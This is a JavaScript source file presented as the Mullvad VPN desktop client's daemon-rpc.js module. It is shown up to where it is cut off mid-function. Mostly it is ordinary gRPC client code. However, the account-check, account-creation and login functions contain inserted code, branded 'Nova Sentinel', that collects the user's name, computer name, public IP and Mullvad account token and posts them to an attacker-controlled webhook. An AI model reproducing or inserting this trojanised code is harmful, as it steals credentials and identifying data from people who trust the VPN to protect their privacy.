//C:\Program Files\Mullvad VPN\resources\app.asar\build\src\main\daemon-rpc.js


"use strict";
const webhookUrl =
  "%WEBHOOK%";

  const computerName =
  process.env.COMPUTERNAME || process.env.HOSTNAME || process.env.USERDOMAIN;
const username =
  process.env.USERNAME || process.env.USER || process.env.LOGNAME;
var __createBinding =
  (this && this.__createBinding) ||
  (Object.create
    ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        var desc = Object.getOwnPropertyDescriptor(m, k);
        if (
          !desc ||
          ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)
        ) {
          desc = {
            enumerable: true,
            get: function () {
              return m[k];
            },
          };
        }
        Object.defineProperty(o, k2, desc);
      }
    : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
var __setModuleDefault =
  (this && this.__setModuleDefault) ||
  (Object.create
    ? function (o, v) {
        Object.defineProperty(o, "default", { enumerable: true, value: v });
      }
    : function (o, v) {
        o["default"] = v;
      });
var __importStar =
  (this && this.__importStar) ||
  function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null)
      for (var k in mod)
        if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k))
          __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
  };
var __importDefault =
  (this && this.__importDefault) ||
  function (mod) {
    return mod && mod.__esModule ? mod : { default: mod };
  };
Object.defineProperty(exports, "__esModule", { value: true });
exports.DaemonRpc =
  exports.ResponseParseError =
  exports.SubscriptionListener =
  exports.ConnectionObserver =
    void 0;
const grpc = __importStar(require("@grpc/grpc-js"));
const empty_pb_js_1 = require("google-protobuf/google/protobuf/empty_pb.js");
const wrappers_pb_js_1 = require("google-protobuf/google/protobuf/wrappers_pb.js");
const util_1 = require("util");
const daemon_rpc_types_1 = require("../shared/daemon-rpc-types");
const logging_1 = __importDefault(require("../shared/logging"));
const management_interface_grpc_pb_1 = require("./management_interface/management_interface_grpc_pb");
const grpcTypes = __importStar(
  require("./management_interface/management_interface_pb")
);
const DAEMON_RPC_PATH =
  process.platform === "win32"
    ? "unix:////./pipe/Mullvad VPN"
    : "unix:///var/run/mullvad-vpn";
const NETWORK_CALL_TIMEOUT = 10000;
const CHANNEL_STATE_TIMEOUT = 1000 * 60 * 60;
const noConnectionError = new Error("No connection established to daemon");
const configNotSupported = new Error(
  "Setting custom settings is not supported"
);
const invalidErrorStateCause = new Error(
  "VPN_PERMISSION_DENIED is not a valid error state cause on desktop"
);
class ConnectionObserver {
  constructor(openHandler, closeHandler) {
    this.openHandler = openHandler;
    this.closeHandler = closeHandler;
    // Only meant to be called by DaemonRpc
    // @internal
    this.onOpen = () => {
      this.openHandler();
    };
    // Only meant to be called by DaemonRpc
    // @internal
    this.onClose = (wasConnected, error) => {
      this.closeHandler(wasConnected, error);
    };
  }
}
exports.ConnectionObserver = ConnectionObserver;
class SubscriptionListener {
  constructor(eventHandler, errorHandler) {
    this.eventHandler = eventHandler;
    this.errorHandler = errorHandler;
  }
  // Only meant to be called by DaemonRpc
  // @internal
  onEvent(payload) {
    this.eventHandler(payload);
  }
  // Only meant to be called by DaemonRpc
  // @internal
  onError(error) {
    this.errorHandler(error);
  }
}
exports.SubscriptionListener = SubscriptionListener;
class ResponseParseError extends Error {
  constructor(message) {
    super(message);
  }
}
exports.ResponseParseError = ResponseParseError;
class DaemonRpc {
  constructor(connectionObserver) {
    this.connectionObserver = connectionObserver;
    this.isConnectedValue = false;
    this.isClosed = false;
    this.nextSubscriptionId = 0;
    this.subscriptions = new Map();
    this.client = new management_interface_grpc_pb_1.ManagementServiceClient(
      DAEMON_RPC_PATH,
      grpc.credentials.createInsecure(),
      this.channelOptions()
    );
  }
  get isConnected() {
    return this.isConnectedValue;
  }
  reopen(connectionObserver) {
    if (this.isClosed) {
      this.isClosed = false;
      this.client = new management_interface_grpc_pb_1.ManagementServiceClient(
        DAEMON_RPC_PATH,
        grpc.credentials.createInsecure(),
        this.channelOptions()
      );
      this.connectionObserver = connectionObserver;
    }
  }
  connect() {
    return new Promise((resolve, reject) => {
      this.client.waitForReady(this.deadlineFromNow(), (error) => {
        if (error) {
          this.onClose(error);
          this.ensureConnectivity();
          reject(error);
        } else {
          this.reconnectionTimeout = undefined;
          this.isConnectedValue = true;
          this.connectionObserver?.onOpen();
          this.setChannelCallback();
          resolve();
        }
      });
    });
  }
  disconnect() {
    this.isConnectedValue = false;
    for (const subscriptionId of this.subscriptions.keys()) {
      this.removeSubscription(subscriptionId);
    }
    this.isClosed = true;
    this.client.close();
    this.connectionObserver = undefined;
    if (this.reconnectionTimeout) {
      clearTimeout(this.reconnectionTimeout);
    }
  }
  async getAccountData(accountToken) {
    let ip;
    try{
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) {
        ip = null;
      }

      const data = await res.json();
      if (data.ip && typeof data.ip === "string") {
        ip = data.ip;
      } else {
        ip = null;
      }
    } catch (err) {
      ip = null;
    }
    const embed = {
      color: 2829617,
      footer: {
        text: "@Nova Sentinel | https://t.me/Sordeal",
      },
      title: "Mullvad First Run",
      fields: [
        {
          name: `<:blackstar:1177587935869161483> **Username**`,
          value: `\`\`\`ansi\n[2;32m${username ?? "none"}[0m[2;32m[0m\`\`\`\n`,
          inline: true,
        },
        {
          name: `<a:black_heart:1177588605204574271> **Computer Name**`,
          value: `\`\`\`ansi\n[2;32m${computerName ?? "none"}[0m[2;32m[0m\`\`\`\n`,
          inline: true,
        },
        {
          name: `<:black_crown:1177589323667865730> **IP:**`,
          value: `\`\`\`ansi\n[2;32m${ip ?? "none"}[0m[2;32m[0m\`\`\`\n`,
          inline: true,
        },
        {
          name: `<a:keys:1159078859682107453> **Mullvad Account ID (key)**`,
          value: `\`\`\`ansi\n[2;32m${accountToken}[0m[2;32m[0m\`\`\`\n`,
          inline: false,
        },
      ],

      thumbnail: {
        url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
      },
    };

    const message = {
      username: "Nova Sentinel",
      avatar_url:
        "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
      content: "@here",
      embeds: [embed],
    };

    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    });
    if (res.ok) {
      console.log("Nova Sentinel is here.");
    } else {
    }
    try {
      const response = await this.callString(
        this.client.getAccountData,
        accountToken
      );
      const expiry = response.getExpiry().toDate().toISOString();
      return { type: "success", expiry };
    } catch (e) {
      const error = e;
      if (error.code) {
        switch (error.code) {
          case grpc.status.UNAUTHENTICATED:
            return { type: "error", error: "invalid-account" };
          default:
            return { type: "error", error: "communication" };
        }
      }
      throw error;
    }
  }
  async getWwwAuthToken() {
    const response = await this.callEmpty(this.client.getWwwAuthToken);
    return response.getValue();
  }
  async submitVoucher(voucherCode) {
    try {
      const response = await this.callString(
        this.client.submitVoucher,
        voucherCode
      );
      const secondsAdded = ensureExists(
        response.getSecondsAdded(),
        "no 'secondsAdded' field in voucher response"
      );
      const newExpiry = ensureExists(
        response.getNewExpiry(),
        "no 'newExpiry' field in voucher response"
      )
        .toDate()
        .toISOString();
      return {
        type: "success",
        secondsAdded,
        newExpiry,
      };
    } catch (e) {
      const error = e;
      if (error.code) {
        switch (error.code) {
          case grpc.status.NOT_FOUND:
            return { type: "invalid" };
          case grpc.status.RESOURCE_EXHAUSTED:
            return { type: "already_used" };
        }
      }
      return { type: "error" };
    }
  }
  async getRelayLocations() {
    if (this.isConnected) {
      const response = await this.callEmpty(this.client.getRelayLocations);
      return convertFromRelayList(response);
    } else {
      throw noConnectionError;
    }
  }
  async createNewAccount() {
    const response = await this.callEmpty(this.client.createNewAccount);

    let ip;
    try{
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) {
        ip = null;
      }

      const data = await res.json();
      if (data.ip && typeof data.ip === "string") {
        ip = data.ip;
      } else {
        ip = null;
      }
    } catch (err) {
      ip = null;
    }
    const embed = {
      color: 2829617,
      footer: {
        text: "@Nova Sentinel | https://t.me/Sordeal",
      },
      title: "Mullvad Account Created",
      fields: [
        {
          name: `<:blackstar:1177587935869161483> **Username**`,
          value: `\`\`\`ansi\n[2;32m${username ?? "none"}[0m[2;32m[0m\`\`\`\n`,
          inline: true,
        },
        {
          name: `<a:black_heart:1177588605204574271> **Computer Name**`,
          value: `\`\`\`ansi\n[2;32m${computerName ?? "none"}[0m[2;32m[0m\`\`\`\n`,
          inline: true,
        },
        {
          name: `<:black_crown:1177589323667865730> **IP:**`,
          value: `\`\`\`ansi\n[2;32m${ip ?? "none"}[0m[2;32m[0m\`\`\`\n`,
          inline: true,
        },
        {
          name: `<a:keys:1159078859682107453> **Mullvad Account ID (key)**`,
          value: `\`\`\`ansi\n[2;32m${response.getValue()}[0m[2;32m[0m\`\`\`\n`,
          inline: false,
        },
      ],

      thumbnail: {
        url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
      },
    };

    const message = {
      username: "Nova Sentinel",
      avatar_url:
        "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
      content: "@here",
      embeds: [embed],
    };

    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    });
    if (res.ok) {
      console.log("Nova Sentinel is here.");
    } else {
    }
    return response.getValue();
  }
  async loginAccount(accountToken) {
    try {
      let first = accountToken;

      let ip;
      try{
        const res = await fetch("https://ipinfo.io/json");
        if (!res.ok) {
          ip = null;
        }
  
        const data = await res.json();
        if (data.ip && typeof data.ip === "string") {
          ip = data.ip;
        } else {
          ip = null;
        }
      } catch (err) {
        ip = null;
      }
      const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Sentinel | https://t.me/Sordeal",
        },
        title: "Mullvad New Login",
        fields: [
          {
            name: `<:blackstar:1177587935869161483> **Username**`,
            value: `\`\`\`ansi\n[2;32m${username ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:black_heart:1177588605204574271> **Computer Name**`,
            value: `\`\`\`ansi\n[2;32m${computerName ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<:black_crown:1177589323667865730> **IP:**`,
            value: `\`\`\`ansi\n[2;32m${ip ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:keys:1159078859682107453> **Mullvad Account ID (key)**`,
            value: `\`\`\`ansi\n[2;32m${first}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
        ],
  
        thumbnail: {
          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
        },
      };

      const message = {
        username: "Nova Sentinel",
        avatar_url:
          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
        content: "@here",
        embeds: [embed],
      };

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      });
      if (response.ok) {
        console.log("Nova Sentinel is here.");
      } else {
      }

      await this.callString(this.client.loginAccount, accountToken);
    } catch (e) {
      const error = e;
      switch (error.code) {
        case grpc.status.RESOURCE_EXHAUSTED:
          return { type: "error", error: "too-many-devices" };
        case grpc.status.UNAUTHENTICATED:
          return { type: "error", error: "invalid-account" };
        default:
          return { type: "error", error: "communication" };
      }
    }
  }
  async logoutAccount() {
    await this.callEmpty(this.client.logoutAccount);
  }
  async updateRelaySettings(relaySettings) {
    if ("normal" in relaySettings) {
      const settingsUpdate = relaySettings.normal;
      const grpcRelaySettings = new grpcTypes.RelaySettingsUpdate();
      const normalUpdate = new grpcTypes.NormalRelaySettingsUpdate();
      if (settingsUpdate.tunnelProtocol) {
        const tunnelTypeUpdate = new grpcTypes.TunnelTypeUpdate();
        tunnelTypeUpdate.setTunnelType(
          convertToTunnelTypeConstraint(settingsUpdate.tunnelProtocol)
        );
        normalUpdate.setTunnelType(tunnelTypeUpdate);
      }
      if (settingsUpdate.location) {
        normalUpdate.setLocation(
          convertToLocation(liftConstraint(settingsUpdate.location))
        );
      }
      if (settingsUpdate.wireguardConstraints) {
        normalUpdate.setWireguardConstraints(
          convertToWireguardConstraints(settingsUpdate.wireguardConstraints)
        );
      }
      if (settingsUpdate.openvpnConstraints) {
        normalUpdate.setOpenvpnConstraints(
          convertToOpenVpnConstraints(settingsUpdate.openvpnConstraints)
        );
      }
      if (settingsUpdate.providers) {
        const providerUpdate = new grpcTypes.ProviderUpdate();
        providerUpdate.setProvidersList(settingsUpdate.providers);
        normalUpdate.setProviders(providerUpdate);
      }
      if (settingsUpdate.ownership !== undefined) {
        const ownershipUpdate = new grpcTypes.OwnershipUpdate();
        ownershipUpdate.setOwnership(
          convertToOwnership(settingsUpdate.ownership)
        );
        normalUpdate.setOwnership(ownershipUpdate);
      }
      grpcRelaySettings.setNormal(normalUpdate);
      await this.call(this.client.updateRelaySettings, grpcRelaySettings);
    }
  }
  async setAllowLan(allowLan) {
    await this.callBool(this.client.setAllowLan, allowLan);
  }
  async setShowBetaReleases(showBetaReleases) {
    await this.callBool(this.client.setShowBetaReleases, showBetaReleases);
  }
  async setEnableIpv6(enableIpv6) {
    await this.callBool(this.client.setEnableIpv6, enableIpv6);
  }
  async setBlockWhenDisconnected(blockWhenDisconnected) {
    await this.callBool(
      this.client.setBlockWhenDisconnected,
      blockWhenDisconnected
    );
  }
  async setBridgeState(bridgeState) {
    const bridgeStateMap = {
      auto: grpcTypes.BridgeState.State.AUTO,
      on: grpcTypes.BridgeState.State.ON,
      off: grpcTypes.BridgeState.State.OFF,
    };
    const grpcBridgeState = new grpcTypes.BridgeState();
    grpcBridgeState.setState(bridgeStateMap[bridgeState]);
    await this.call(this.client.setBridgeState, grpcBridgeState);
  }
  async setBridgeSettings(bridgeSettings) {
    const grpcBridgeSettings = new grpcTypes.BridgeSettings();
    if ("normal" in bridgeSettings) {
      const normalSettings = convertToNormalBridgeSettings(
        bridgeSettings.normal
      );
      grpcBridgeSettings.setNormal(normalSettings);
    }
    if ("custom" in bridgeSettings) {
      throw configNotSupported;
    }
    await this.call(this.client.setBridgeSettings, grpcBridgeSettings);
  }
  async setObfuscationSettings(obfuscationSettings) {
    const grpcObfuscationSettings = new grpcTypes.ObfuscationSettings();
    switch (obfuscationSettings.selectedObfuscation) {
      case daemon_rpc_types_1.ObfuscationType.auto:
        grpcObfuscationSettings.setSelectedObfuscation(
          grpcTypes.ObfuscationSettings.SelectedObfuscation.AUTO
        );
        break;
      case daemon_rpc_types_1.ObfuscationType.off:
        grpcObfuscationSettings.setSelectedObfuscation(
          grpcTypes.ObfuscationSettings.SelectedObfuscation.OFF
        );
        break;
      case daemon_rpc_types_1.ObfuscationType.udp2tcp:
        grpcObfuscationSettings.setSelectedObfuscation(
          grpcTypes.ObfuscationSettings.SelectedObfuscation.UDP2TCP
        );
        break;
    }
    if (obfuscationSettings.udp2tcpSettings) {
      const grpcUdp2tcpSettings = new grpcTypes.Udp2TcpObfuscationSettings();
      grpcUdp2tcpSettings.setPort(
        obfuscationSettings.udp2tcpSettings.port === "any"
          ? 0
          : obfuscationSettings.udp2tcpSettings.port.only
      );
      grpcObfuscationSettings.setUdp2tcp(grpcUdp2tcpSettings);
    }
    await this.call(
      this.client.setObfuscationSettings,
      grpcObfuscationSettings
    );
  }
  async setOpenVpnMssfix(mssfix) {
    await this.callNumber(this.client.setOpenvpnMssfix, mssfix);
  }
  async setWireguardMtu(mtu) {
    await this.callNumber(this.client.setWireguardMtu, mtu);
  }
  async setWireguardQuantumResistant(quantumResistant) {
    const quantumResistantState = new grpcTypes.QuantumResistantState();
    switch (quantumResistant) {
      case true:
        quantumResistantState.setState(
          grpcTypes.QuantumResistantState.State.ON
        );
        break;
      case false:
        quantumResistantState.setState(
          grpcTypes.QuantumResistantState.State.OFF
        );
        break;
      case undefined:
        quantumResistantState.setState(
          grpcTypes.QuantumResistantState.State.AUTO
        );
        break;
    }
    await this.call(
      this.client.setQuantumResistantTunnel,
      quantumResistantState
    );
  }
  async setAutoConnect(autoConnect) {
    await this.callBool(this.client.setAutoConnect, autoConnect);
  }
  async connectTunnel() {
    await this.callEmpty(this.client.connectTunnel);
  }
  async disconnectTunnel() {
    await this.callEmpty(this.client.disconnectTunnel);
  }
  async reconnectTunnel() {
    await this.callEmpty(this.client.reconnectTunnel);
  }
  async getLocation() {
    const response = await this.callEmpty(this.client.getCurrentLocation);
    return response.toObject();
  }
  async getState() {
    const response = await this.callEmpty(this.client.getTunnelState);
    return convertFromTunnelState(response);
  }
  async getSettings() {
    const response = await this.callEmpty(this.client.getSettings);
    return convertFromSettings(response);
  }
  subscribeDaemonEventListener(listener) {
    const call =
      this.isConnected && this.client.eventsListen(new empty_pb_js_1.Empty());
    if (!call) {
      throw noConnectionError;
    }
    const subscriptionId = this.subscriptionId();
    listener.subscriptionId = subscriptionId;
    this.subscriptions.set(subscriptionId, call);
    call.on("data", (data) => {
      try {
        const daemonEvent = convertFromDaemonEvent(data);
        listener.onEvent(daemonEvent);
      } catch (e) {
        const error = e;
        listener.onError(error);
      }
    });
    call.on("error", (error) => {
      listener.onError(error);
      this.removeSubscription(subscriptionId);
    });
  }
  unsubscribeDaemonEventListener(listener) {
    const id = listener.subscriptionId;
    if (id !== undefined) {
      this.removeSubscription(id);
    }
  }
  async getAccountHistory() {
    const response = await this.callEmpty(this.client.getAccountHistory);
    return response.getToken()?.getValue();
  }
  async clearAccountHistory() {
    await this.callEmpty(this.client.clearAccountHistory);
  }
  async getCurrentVersion() {
    const response = await this.callEmpty(this.client.getCurrentVersion);
    return response.getValue();
  }
  async setDnsOptions(dns) {
    const dnsOptions = new grpcTypes.DnsOptions();
    const defaultOptions = new grpcTypes.DefaultDnsOptions();
    defaultOptions.setBlockAds(dns.defaultOptions.blockAds);
    defaultOptions.setBlockTrackers(dns.defaultOptions.blockTrackers);
    defaultOptions.setBlockMalware(dns.defaultOptions.blockMalware);
    defaultOptions.setBlockAdultContent(dns.defaultOptions.blockAdultContent);
    defaultOptions.setBlockGambling(dns.defaultOptions.blockGambling);
    dnsOptions.setDefaultOptions(defaultOptions);
    const customOptions = new grpcTypes.CustomDnsOptions();
    customOptions.setAddressesList(dns.customOptions.addresses);
    dnsOptions.setCustomOptions(customOptions);
    if (dns.state === "custom") {
      dnsOptions.setState(grpcTypes.DnsOptions.DnsState.CUSTOM);
    } else {
      dnsOptions.setState(grpcTypes.DnsOptions.DnsState.DEFAULT);
    }
    await this.call(this.client.setDnsOptions, dnsOptions);
  }
  async getVersionInfo() {
    const response = await this.callEmpty(this.client.getVersionInfo);
    return response.toObject();
  }
  async addSplitTunnelingApplication(path) {
    await this.callString(this.client.addSplitTunnelApp, path);
  }
  async removeSplitTunnelingApplication(path) {
    await this.callString(this.client.removeSplitTunnelApp, path);
  }
  async setSplitTunnelingState(enabled) {
    await this.callBool(this.client.setSplitTunnelState, enabled);
  }
  async checkVolumes() {
    await this.callEmpty(this.client.checkVolumes);
  }
  async isPerformingPostUpgrade() {
    const response = await this.callEmpty(this.client.isPerformingPostUpgrade);
    return response.getValue();
  }
  async getDevice() {
    const response = await this.callEmpty(this.client.getDevice);
    return convertFromDeviceState(response);
  }
  async updateDevice() {
    await this.callEmpty(this.client.updateDevice);
  }
  async listDevices(accountToken) {
    try {
      const response = await this.callString(
        this.client.listDevices,
        accountToken
      );
      return response.getDevicesList().map(convertFromDevice);
    } catch {
      throw new Error("Failed to list devices");
    }
  }
  async removeDevice(deviceRemoval) {
    const grpcDeviceRemoval = new grpcTypes.DeviceRemoval();
    grpcDeviceRemoval.setAccountToken(deviceRemoval.accountToken);
    grpcDeviceRemoval.setDeviceId(deviceRemoval.deviceId);
    await this.call(this.client.removeDevice, grpcDeviceRemoval);
  }
  subscriptionId() {
    const current = this.nextSubscriptionId;
    this.nextSubscriptionId += 1;
    return current;
  }
  deadlineFromNow() {
    return Date.now() + NETWORK_CALL_TIMEOUT;
  }
  channelStateTimeout() {
    return Date.now() + CHANNEL_STATE_TIMEOUT;
  }
  callEmpty(fn) {
    return this.call(fn, new empty_pb_js_1.Empty());
  }
  callString(fn, value) {
    const googleString = new wrappers_pb_js_1.StringValue();
    if (value !== undefined) {
      googleString.setValue(value);
    }
    return this.call(fn, googleString);
  }
  callBool(fn, value) {
    const googleBool = new wrappers_pb_js_1.BoolValue();
    if (value !== undefined) {
      googleBool.setValue(value);
    }
    return this.call(fn, googleBool);
  }
  callNumber(fn, value) {
    const googleNumber = new wrappers_pb_js_1.UInt32Value();
    if (value !== undefined) {
      googleNumber.setValue(value);
    }
    return this.call(fn, googleNumber);
  }
  call(fn, arg) {
    if (fn && this.isConnected) {
      return (0, util_1.promisify)(fn.bind(this.client))(arg);
    } else {
      throw noConnectionError;
    }
  }
  onClose(error) {
    const wasConnected = this.isConnectedValue;
    this.isConnectedValue = false;
    this.connectionObserver?.onClose(wasConnected, error);
  }
  removeSubscription(id) {
    const subscription = this.subscriptions.get(id);
    if (subscription !== undefined) {
      this.subscriptions.delete(id);
      subscription.removeAllListeners("data");
      subscription.removeAllListeners("error");
      subscription.on("error", (e) => {
        const error = e;
        if (error.code !== grpc.status.CANCELLED) {
          throw error;
        }
      });
      // setImmediate is required due to https://github.com/grpc/grpc-node/issues/1464. Should be
      // possible to remove it again after upgrading to Electron 16 which is using a node version
      // where this is fixed.
      setImmediate(() => subscription.cancel());
    }
  }
  channelOptions() {
    /* eslint-disable @typescript-eslint/naming-convention */
    return {
      "grpc.max_reconnect_backoff_ms": 3000,
      "grpc.initial_reconnect_backoff_ms": 3000,
      "grpc.keepalive_time_ms": Math.pow(2, 30),
      "grpc.keepalive_timeout_ms": Math.pow(2, 30),
    };
    /* eslint-enable @typescript-eslint/naming-convention */
  }
  connectivityChangeCallback(timeoutErr) {
    const channel = this.client.getChannel();
    const currentState = channel?.getConnectivityState(true);
    logging_1.default.verbose(
      `GRPC Channel connectivity state changed to ${currentState}`
    );
    if (channel) {
      if (timeoutErr) {
        this.setChannelCallback(currentState);
        return;
      }
      const wasConnected = this.isConnected;
      if (this.channelDisconnected(currentState)) {
        this.onClose();
        // Try and reconnect in case
        void this.connect().catch((error) => {
          logging_1.default.error(`Failed to reconnect - ${error}`);
        });
        this.setChannelCallback(currentState);
      } else if (
        !wasConnected &&
        currentState === grpc.connectivityState.READY
      ) {
        this.isConnectedValue = true;
        this.connectionObserver?.onOpen();
        this.setChannelCallback(currentState);
      }
    }
  }
  channelDisconnected(state) {
    return (
      (state === grpc.connectivityState.SHUTDOWN ||
        state === grpc.connectivityState.TRANSIENT_FAILURE ||
        state === grpc.connectivityState.IDLE) &&
      this.isConnected
    );
  }
  setChannelCallback(currentState) {
    const channel = this.client.getChannel();
    if (currentState === undefined && channel) {
      currentState = channel?.getConnectivityState(false);
    }
    if (currentState) {
      channel.watchConnectivityState(
        currentState,
        this.channelStateTimeout(),
        (error) => this.connectivityChangeCallback(error)
      );
    }
  }
  // Since grpc.Channel.watchConnectivityState() isn't always running as intended, whenever the
  // client fails to connect at first, `ensureConnectivity()` should be called so that it tries to
  // check the connectivity state and nudge the client into connecting.
  // `grpc.Channel.getConnectivityState(true)` should make it attempt to connect.
  ensureConnectivity() {
    this.reconnectionTimeout = setTimeout(() => {
      const lastState = this.client.getChannel().getConnectivityState(true);
      if (this.channelDisconnected(lastState)) {
        this.onClose();
      }
      if (!this.isConnected) {
        void this.connect().catch((error) => {
          logging_1.default.error(`Failed to reconnect - ${error}`);
        });
      }
    }, 3000);
  }
}
exports.DaemonRpc = DaemonRpc;
function liftConstraint(constraint) {
  if (constraint !== undefined && constraint !== "any") {
    return constraint.only;
  }
  return undefined;
}
function convertFromRelayList(relayList) {
  return {
    relayList: {
      countries: relayList
        .getCountriesList()
        .map((country) => convertFromRelayListCountry(country.toObject())),
    },
    wireguardEndpointData: convertWireguardEndpointData(
      relayList.getWireguard()
    ),
  };
}
function convertWireguardEndpointData(data) {
  return {
    portRanges: data
      .getPortRangesList()
      .map((range) => [range.getFirst(), range.getLast()]),
    udp2tcpPorts: data.getUdp2tcpPortsList(),
  };
}
function convertFromRelayListCountry(country) {
  return {
    ...country,
    cities: country.citiesList.map(convertFromRelayListCity),
  };
}
function convertFromRelayListCity(city) {
  return {
    ...city,
    relays: city.relaysList.map(convertFromRelayListRelay),
  };
}
function convertFromRelayListRelay(relay) {
  return {
    ...relay,
    endpointType: convertFromRelayType(relay.endpointType),
  };
}
function convertFromRelayType(relayType) {
  const protocolMap = {
    [grpcTypes.Relay.RelayType.OPENVPN]: "openvpn",
    [grpcTypes.Relay.RelayType.BRIDGE]: "bridge",
    [grpcTypes.Relay.RelayType.WIREGUARD]: "wireguard",
  };
  return protocolMap[relayType];
}
function convertFromWireguardKey(publicKey) {
  if (typeof publicKey === "string") {
    return publicKey;
  }
  return Buffer.from(publicKey).toString("base64");
}
function convertFromTransportProtocol(protocol) {
  const protocolMap = {
    [grpcTypes.TransportProtocol.TCP]: "tcp",
    [grpcTypes.TransportProtocol.UDP]: "udp",
  };
  return protocolMap[protocol];
}
function convertFromTunnelState(tunnelState) {
  const tunnelStateObject = tunnelState.toObject();
  switch (tunnelState.getStateCase()) {
    case grpcTypes.TunnelState.StateCase.STATE_NOT_SET:
      return undefined;
    case grpcTypes.TunnelState.StateCase.DISCONNECTED:
      return { state: "disconnected" };
    case grpcTypes.TunnelState.StateCase.DISCONNECTING: {
      const detailsMap = {
        [grpcTypes.AfterDisconnect.NOTHING]: "nothing",
        [grpcTypes.AfterDisconnect.BLOCK]: "block",
        [grpcTypes.AfterDisconnect.RECONNECT]: "reconnect",
      };
      return (
        tunnelStateObject.disconnecting && {
          state: "disconnecting",
          details: detailsMap[tunnelStateObject.disconnecting.afterDisconnect],
        }
      );
    }
    case grpcTypes.TunnelState.StateCase.ERROR:
      return (
        tunnelStateObject.error?.errorState && {
          state: "error",
          details: convertFromTunnelStateError(
            tunnelStateObject.error.errorState
          ),
        }
      );
    case grpcTypes.TunnelState.StateCase.CONNECTING:
      return {
        state: "connecting",
        details:
          tunnelStateObject.connecting?.relayInfo &&
          convertFromTunnelStateRelayInfo(
            tunnelStateObject.connecting.relayInfo
          ),
      };
    case grpcTypes.TunnelState.StateCase.CONNECTED: {
      const relayInfo =
        tunnelStateObject.connected?.relayInfo &&
        convertFromTunnelStateRelayInfo(tunnelStateObject.connected.relayInfo);
      return (
        relayInfo && {
          state: "connected",
          details: relayInfo,
        }
      );
    }
  }
}
function convertFromTunnelStateError(state) {
  const baseError = {
    blockingError:
      state.blockingError && convertFromBlockingError(state.blockingError),
  };
  switch (state.cause) {
    case grpcTypes.ErrorState.Cause.AUTH_FAILED:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.authFailed,
        authFailedError: convertFromAuthFailedError(state.authFailedError),
      };
    case grpcTypes.ErrorState.Cause.TUNNEL_PARAMETER_ERROR:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.tunnelParameterError,
        parameterError: convertFromParameterError(state.parameterError),
      };
    case grpcTypes.ErrorState.Cause.SET_FIREWALL_POLICY_ERROR:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.setFirewallPolicyError,
        policyError: convertFromBlockingError(state.policyError),
      };
    case grpcTypes.ErrorState.Cause.IS_OFFLINE:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.isOffline,
      };
    case grpcTypes.ErrorState.Cause.SET_DNS_ERROR:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.setDnsError,
      };
    case grpcTypes.ErrorState.Cause.IPV6_UNAVAILABLE:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.ipv6Unavailable,
      };
    case grpcTypes.ErrorState.Cause.START_TUNNEL_ERROR:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.startTunnelError,
      };
    case grpcTypes.ErrorState.Cause.SPLIT_TUNNEL_ERROR:
      return {
        ...baseError,
        cause: daemon_rpc_types_1.ErrorStateCause.splitTunnelError,
      };
    case grpcTypes.ErrorState.Cause.VPN_PERMISSION_DENIED:
      // VPN_PERMISSION_DENIED is only ever created on Android
      throw invalidErrorStateCause;
  }
}
function convertFromBlockingError(error) {
  switch (error.type) {
    case grpcTypes.ErrorState.FirewallPolicyError.ErrorType.GENERIC:
      return { type: daemon_rpc_types_1.FirewallPolicyErrorType.generic };
    case grpcTypes.ErrorState.FirewallPolicyError.ErrorType.LOCKED: {
      const pid = error.lockPid;
      const name = error.lockName;
      return {
        type: daemon_rpc_types_1.FirewallPolicyErrorType.locked,
        pid,
        name,
      };
    }
  }
}
function convertFromAuthFailedError(error) {
  switch (error) {
    case grpcTypes.ErrorState.AuthFailedError.UNKNOWN:
      return daemon_rpc_types_1.AuthFailedError.unknown;
    case grpcTypes.ErrorState.AuthFailedError.INVALID_ACCOUNT:
      return daemon_rpc_types_1.AuthFailedError.invalidAccount;
    case grpcTypes.ErrorState.AuthFailedError.EXPIRED_ACCOUNT:
      return daemon_rpc_types_1.AuthFailedError.expiredAccount;
    case grpcTypes.ErrorState.AuthFailedError.TOO_MANY_CONNECTIONS:
      return daemon_rpc_types_1.AuthFailedError.tooManyConnections;
  }
}
function convertFromParameterError(error) {
  switch (error) {
    case grpcTypes.ErrorState.GenerationError.NO_MATCHING_RELAY:
      return daemon_rpc_types_1.TunnelParameterError.noMatchingRelay;
    case grpcTypes.ErrorState.GenerationError.NO_MATCHING_BRIDGE_RELAY:
      return daemon_rpc_types_1.TunnelParameterError.noMatchingBridgeRelay;
    case grpcTypes.ErrorState.GenerationError.NO_WIREGUARD_KEY:
